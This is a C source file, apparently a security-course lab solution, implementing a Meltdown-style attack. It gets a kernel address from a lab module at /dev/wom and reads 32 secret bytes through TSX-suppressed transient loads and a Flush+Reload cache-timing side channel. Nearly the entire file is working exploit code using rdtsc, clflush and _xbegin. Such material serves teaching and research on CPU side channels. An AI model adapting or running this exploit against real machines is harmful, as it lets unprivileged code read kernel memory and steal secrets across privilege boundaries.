#include <ctype.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <fcntl.h>
#include <setjmp.h>
#include <signal.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <x86intrin.h>
#include <immintrin.h>

/* for ioctl */
#define WOM_MAGIC_NUM 0x1337
#define WOM_GET_ADDRESS \
    _IOR(WOM_MAGIC_NUM, 0, unsigned long)

#define KB (1024)
#define PAGE_SIZE (4*KB)
#define PROBE_BUFFER_SIZE (PAGE_SIZE*256)
#define PROBE_NUM 20
#define EXTRACT_SIZE 32
#define MAX_THEASHOLD 300

void *
wom_get_address(int fd)
{
    void *addr = NULL;

    if (ioctl(fd, WOM_GET_ADDRESS, &addr) < 0)
        return NULL;

    return addr;
}



static void flush(void *p) 
{
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}


unsigned long time_access_no_flush(const char *adrs) 
{
  volatile unsigned long time;
  asm __volatile__ (
    "  mfence             \n" 
    "  lfence             \n" 
    "  rdtsc              \n"
    "  lfence             \n"
    "  movl %%eax, %%esi  \n"
    "  movl (%1), %%eax   \n"
    "  lfence             \n"
    "  rdtsc              \n"
    "  subl %%esi, %%eax  \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");
  return time;
}


unsigned int find_threshold()
{
    const char *addr = malloc(8);
    uint64_t t1=0, t2=0, t_sum_flush=0, t_sum_no_flush=0;

    for(size_t i = 0; i < PROBE_NUM; i++)
    {
        if(i%2==0)
        {
            asm __volatile__ ("mfence\nclflush 0(%0)" : : "r" (addr) :);
            t_sum_flush += time_access_no_flush(addr);
        }

        else
            t_sum_no_flush += time_access_no_flush(addr);
        
    }
    t_sum_flush = t_sum_flush / (PROBE_NUM/2);
    t_sum_no_flush = t_sum_no_flush / (PROBE_NUM/2);
    return (t_sum_flush + t_sum_no_flush)/2;
     
}


int main(int argc, char *argv[])
{
    const char *secret;
    int fd;
    fd = open("/dev/wom", O_RDONLY);

    //  Attack variables defined here

    //  Probing Buffer
    char *probe_buffer = malloc(PROBE_BUFFER_SIZE);
    memset(probe_buffer, 0, PROBE_BUFFER_SIZE);

    //  Timing results
    unsigned int probing_times_min[256];
    memset(probing_times_min, -1, 256*sizeof(unsigned int));

    //  Introduce noise to fool prefetcher
    char* noise = malloc(1 * sizeof(char));

    //  Result
    unsigned char extracted_bytes[EXTRACT_SIZE];

    if (fd < 0) 
    {
        perror("open");
        fprintf(stderr, "error: unable to open /dev/wom. "
            "Please build and load the wom kernel module.\n");
        return -1;
    }

    secret = wom_get_address(fd);
    

    //  My attack

    unsigned int threshold = 100;
    if(argc < 2)
    {
        threshold = find_threshold(probe_buffer);
    }
    else
    {
        threshold = atoi(argv[1]);
    }
    

    printf("Threshold: %u\n", threshold);
        
    for(size_t byte_index = 0; byte_index < EXTRACT_SIZE; byte_index++)
    {
        for(size_t g = 0; g < PROBE_NUM; g++)
        {
            for(size_t i = 0; i < 256; i++)
            {
                asm __volatile__ ("clflush 0(%0)" : : "r" (&probe_buffer[i*PAGE_SIZE]) :);

                unsigned status = _xbegin();

                char h = *(probe_buffer + ((*(secret+byte_index)) * PAGE_SIZE));

                _xend();

            

	            unsigned int r = i*PAGE_SIZE;
	            unsigned int elapsed_time = time_access_no_flush(probe_buffer+r);
	            if(probing_times_min[i] > elapsed_time)
	                    probing_times_min[i] = elapsed_time;
            }


        }
        for(size_t i = 1; i < 256; i++)
        {
            if(probing_times_min[i] < threshold)
            {
                extracted_bytes[byte_index]=i;
                break;
            }
            if(i == 255)
                byte_index--;
            
        }
        memset(probing_times_min, -1, 256*sizeof(unsigned int));
    }

    printf("%.32s\n", extracted_bytes);


    
    close(fd);

    return 0;

err_close:
    close(fd);
    return -1;
}
